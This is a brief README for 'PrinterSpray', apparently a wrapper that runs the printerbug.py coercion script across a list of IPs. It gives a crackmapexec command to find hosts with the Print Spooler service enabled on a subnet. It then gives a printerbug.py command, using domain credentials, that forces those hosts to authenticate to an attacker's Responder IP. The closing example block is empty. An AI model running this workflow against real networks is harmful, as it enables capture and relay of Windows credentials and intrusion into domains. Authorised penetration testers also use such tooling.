# PrinterSpray

Wrapper of https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py to be used with a list of IPs. 

Discover potentual targets

```
crackmapexec smb [subnet] -M spooler | grep "Spooler service enabled" | awk -F " " '{print$2}' > spooler.txt
```

Run against hosts that have the spooler service enabled

```
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

Example:

```
```
